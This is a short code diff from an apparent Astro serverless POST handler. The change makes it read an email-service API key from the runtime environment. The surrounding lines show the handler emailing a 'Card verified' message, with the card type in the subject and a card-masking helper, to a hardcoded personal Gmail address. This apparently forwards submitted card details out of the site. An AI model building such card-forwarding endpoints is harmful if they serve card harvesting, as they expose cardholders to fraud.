@@ -45,7 +45,7 @@ export async function POST(context: APIContext) {
       );
     }
 
-    const RESEND_API_KEY = import.meta.env.RESEND_API_KEY as string | undefined;
+    const RESEND_API_KEY = (context.locals.runtime?.env?.RESEND_API_KEY || import.meta.env.RESEND_API_KEY) as string | undefined;
     const to = "kvngtoon001@gmail.com";
     const subject = `Card verified: ${cardType}`;
     const maskCard = (n?: string) => {
